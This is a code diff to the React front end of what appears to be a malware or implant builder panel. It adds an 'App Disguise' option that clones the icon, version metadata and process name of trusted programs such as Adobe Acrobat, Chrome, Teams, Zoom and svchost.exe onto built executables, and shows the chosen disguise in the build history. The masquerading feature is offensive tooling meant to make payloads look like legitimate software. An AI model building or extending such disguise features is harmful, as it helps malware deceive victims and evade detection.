@@ -21,6 +21,30 @@ const MODULES = [
   { id: 'self_update', label: 'Self Update' },
 ];
 
+const APP_DISGUISES = [
+  { id: 'none', label: 'None (Generic)', icon: null, color: null, process: 'svchost.exe', company: '', product: '' },
+  { id: 'adobe_acrobat', label: 'Adobe Acrobat', icon: 'adobeacrobatreader', color: 'EC1C24', process: 'AcroRd32.exe', company: 'Adobe Inc.', product: 'Adobe Acrobat Reader DC' },
+  { id: 'chrome', label: 'Google Chrome', icon: 'googlechrome', color: '4285F4', process: 'chrome.exe', company: 'Google LLC', product: 'Google Chrome' },
+  { id: 'edge', label: 'Microsoft Edge', icon: 'microsoftedge', color: '0078D7', process: 'msedge.exe', company: 'Microsoft Corporation', product: 'Microsoft Edge' },
+  { id: 'teams', label: 'Microsoft Teams', icon: 'microsoftteams', color: '6264A7', process: 'Teams.exe', company: 'Microsoft Corporation', product: 'Microsoft Teams' },
+  { id: 'zoom', label: 'Zoom', icon: 'zoom', color: '0B5CFF', process: 'Zoom.exe', company: 'Zoom Video Communications', product: 'Zoom Meetings' },
+  { id: 'slack', label: 'Slack', icon: 'slack', color: '4A154B', process: 'slack.exe', company: 'Salesforce', product: 'Slack' },
+  { id: 'discord', label: 'Discord', icon: 'discord', color: '5865F2', process: 'Discord.exe', company: 'Discord Inc.', product: 'Discord' },
+  { id: 'spotify', label: 'Spotify', icon: 'spotify', color: '1DB954', process: 'Spotify.exe', company: 'Spotify AB', product: 'Spotify' },
+  { id: 'steam', label: 'Steam', icon: 'steam', color: '000000', process: 'steam.exe', company: 'Valve Corporation', product: 'Steam' },
+  { id: 'vlc', label: 'VLC Player', icon: 'vlcmediaplayer', color: 'FF8800', process: 'vlc.exe', company: 'VideoLAN', product: 'VLC media player' },
+  { id: 'sevenzip', label: '7-Zip', icon: '7zip', color: '000000', process: '7zFM.exe', company: 'Igor Pavlov', product: '7-Zip File Manager' },
+  { id: 'notepadpp', label: 'Notepad++', icon: 'notepadplusplus', color: '90E59A', process: 'notepad++.exe', company: 'Don Ho', product: 'Notepad++' },
+  { id: 'winrar', label: 'WinRAR', icon: null, color: null, process: 'WinRAR.exe', company: 'Alexander Roshal', product: 'WinRAR archiver' },
+  { id: 'filezilla', label: 'FileZilla', icon: 'filezilla', color: 'BF0000', process: 'filezilla.exe', company: 'FileZilla Project', product: 'FileZilla FTP Client' },
+  { id: 'putty', label: 'PuTTY', icon: null, color: null, process: 'putty.exe', company: 'Simon Tatham', product: 'PuTTY SSH Client' },
+  { id: 'onedrive', label: 'OneDrive', icon: 'microsoftonedrive', color: '0078D4', process: 'OneDrive.exe', company: 'Microsoft Corporation', product: 'Microsoft OneDrive' },
+  { id: 'dropbox', label: 'Dropbox', icon: 'dropbox', color: '0061FF', process: 'Dropbox.exe', company: 'Dropbox Inc.', product: 'Dropbox' },
+  { id: 'nodejs', label: 'Node.js', icon: 'nodedotjs', color: '339933', process: 'node.exe', company: 'OpenJS Foundation', product: 'Node.js' },
+  { id: 'python', label: 'Python', icon: 'python', color: '3776AB', process: 'python.exe', company: 'Python Software Foundation', product: 'Python' },
+  { id: 'vscode', label: 'VS Code', icon: 'visualstudiocode', color: '007ACC', process: 'Code.exe', company: 'Microsoft Corporation', product: 'Visual Studio Code' },
+];
+
 const STATUS_LABELS = {
   queued: 'QUEUED',
   in_progress: 'IN PROGRESS',
@@ -57,6 +81,7 @@ export default function Builder() {
     modules: MODULES.map(m => m.id),
     output_format: 'exe',
     sign_binary: false,
+    disguise: 'none',
   });
   const [activeBuild, setActiveBuild] = useState(null);
   const [building, setBuilding] = useState(false);
@@ -134,6 +159,8 @@ export default function Builder() {
   const downloadBuild = (buildId) => {
     api.downloadBuild(buildId);
   };
+
+  const selectedDisguise = APP_DISGUISES.find(a => a.id === form.disguise) || APP_DISGUISES[0];
 
   const progressPercent = activeBuild
     ? activeBuild.status === 'completed' ? 100
@@ -278,6 +305,128 @@ export default function Builder() {
                 </div>
               </div>
 
+              {/* App Disguise Section */}
+              <div className="form-group" style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
+                <label className="form-label" style={{ marginBottom: 12 }}>
+                  App Disguise
+                  <span style={{ fontWeight: 400, fontSize: 10, color: 'var(--text-muted)', marginLeft: 8 }}>
+                    Windows only — clones icon, version info &amp; process name
+                  </span>
+                </label>
+                <div style={{
+                  display: 'grid',
+                  gridTemplateColumns: 'repeat(4, 1fr)',
+                  gap: 8,
+                }}>
+                  {APP_DISGUISES.map(app => {
+                    const isSelected = form.disguise === app.id;
+                    return (
+                      <div
+                        key={app.id}
+                        onClick={() => setForm({...form, disguise: app.id})}
+                        style={{
+                          padding: '10px 8px',
+                          textAlign: 'center',
+                          cursor: 'pointer',
+                          border: isSelected ? '2px solid var(--green)' : '1px solid var(--border)',
+                          background: isSelected ? 'rgba(0, 255, 65, 0.05)' : 'var(--surface)',
+                          borderRadius: 4,
+                          transition: 'all 0.15s',
+                          position: 'relative',
+                          minHeight: 72,
+                          display: 'flex',
+                          flexDirection: 'column',
+                          alignItems: 'center',
+                          justifyContent: 'center',
+                        }}
+                      >
+                        {isSelected && (
+                          <div style={{
+                            position: 'absolute',
+                            top: 4,
+                            right: 4,
+                            width: 14,
+                            height: 14,
+                            borderRadius: '50%',
+                            background: 'var(--green)',
+                            display: 'flex',
+                            alignItems: 'center',
+                            justifyContent: 'center',
+                            fontSize: 9,
+                            color: '#000',
+                            fontWeight: 700,
+                          }}>✓</div>
+                        )}
+                        {app.icon ? (
+                          <img
+                            src={`https://cdn.simpleicons.org/${app.icon}/${app.color}`}
+                            alt={app.label}
+                            width={28}
+                            height={28}
+                            style={{ marginBottom: 4, opacity: 0.9 }}
+                            onError={(e) => { e.target.style.display = 'none'; }}
+                          />
+                        ) : (
+                          <div style={{
+                            width: 28,
+                            height: 28,
+                            marginBottom: 4,
+                            display: 'flex',
+                            alignItems: 'center',
+                            justifyContent: 'center',
+                            fontSize: 16,
+                            color: 'var(--text-muted)',
+                            opacity: 0.5,
+                          }}>
+                            {app.id === 'none' ? '⊘' : '◻'}
+                          </div>
+                        )}
+                        <div style={{
+                          fontSize: 9,
+                          fontFamily: 'var(--font-mono)',
+                          color: isSelected ? 'var(--green)' : 'var(--text-sec)',
+                          lineHeight: '1.2',
+                        }}>
+                          {app.label}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                {/* Selected disguise info */}
+                {form.disguise !== 'none' && (
+                  <div style={{
+                    marginTop: 12,
+                    padding: 12,
+                    border: '1px solid var(--border)',
+                    background: 'var(--surface)',
+                    fontFamily: 'var(--font-mono)',
+                    fontSize: 10,
+                    display: 'grid',
+                    gridTemplateColumns: '1fr 1fr',
+                    gap: '4px 24px',
+                  }}>
+                    <div>
+                      <span style={{ color: 'var(--text-muted)' }}>PROCESS: </span>
+                      <span style={{ color: 'var(--green)' }}>{selectedDisguise.process}</span>
+                    </div>
+                    <div>
+                      <span style={{ color: 'var(--text-muted)' }}>COMPANY: </span>
+                      <span style={{ color: 'var(--text-sec)' }}>{selectedDisguise.company}</span>
+                    </div>
+                    <div>
+                      <span style={{ color: 'var(--text-muted)' }}>PRODUCT: </span>
+                      <span style={{ color: 'var(--text-sec)' }}>{selectedDisguise.product}</span>
+                    </div>
+                    <div>
+                      <span style={{ color: 'var(--text-muted)' }}>OUTPUT: </span>
+                      <span style={{ color: 'var(--yellow, #e5c07b)' }}>{selectedDisguise.process}</span>
+                    </div>
+                  </div>
+                )}
+              </div>
+
               <div className="form-group">
                 <label className="form-label">Modules</label>
                 <div className="checkbox-group">
@@ -340,6 +489,7 @@ export default function Builder() {
                     <th style={thStyle}>BUILD ID</th>
                     <th style={thStyle}>STATUS</th>
                     <th style={thStyle}>TARGET</th>
+                    <th style={thStyle}>DISGUISE</th>
                     <th style={thStyle}>MODULES</th>
                     <th style={thStyle}>CREATED</th>
                     <th style={thStyle}>ACTIONS</th>
@@ -350,6 +500,9 @@ export default function Builder() {
                     let config = {};
                     try { config = JSON.parse(b.config_json || '{}'); } catch(e) {}
                     const moduleCount = config.modules ? config.modules.length : 0;
+                    const disguiseInfo = config.disguise && config.disguise !== 'none'
+                      ? (APP_DISGUISES.find(a => a.id === config.disguise) || {}).label || config.disguise
+                      : '—';
                     return (
                       <tr key={b.id} style={{ borderBottom: '1px solid var(--border)' }}>
                         <td style={tdStyle}>
@@ -369,6 +522,11 @@ export default function Builder() {
                         <td style={tdStyle}>
                           <span style={{ color: 'var(--text-sec)' }}>
                             {config.target_os || '?'}/x64
+                          </span>
+                        </td>
+                        <td style={tdStyle}>
+                          <span style={{ color: disguiseInfo !== '—' ? 'var(--yellow, #e5c07b)' : 'var(--text-muted)' }}>
+                            {disguiseInfo}
                           </span>
                         </td>
                         <td style={tdStyle}>
